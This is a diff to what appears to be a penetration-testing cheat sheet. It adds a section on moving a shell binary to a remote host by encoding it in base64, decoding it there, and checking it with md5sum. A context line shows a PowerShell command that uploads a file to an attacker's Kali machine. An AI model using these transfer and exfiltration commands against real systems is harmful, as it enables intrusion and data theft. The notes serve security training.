@@ -1987,6 +1987,14 @@ powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/u
 ````
 service apache2 stop
 ````
+## Base64 File transfare
+````
+promise2k@htb[/htb]$ base64 shell -w 0
+f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
+on remote host run below
+user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
+validate with md5sum shell on both local and remote
+````
 
 ## Linux System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/546/546049.png" width="40" height="40" />
 ### Use this guide first
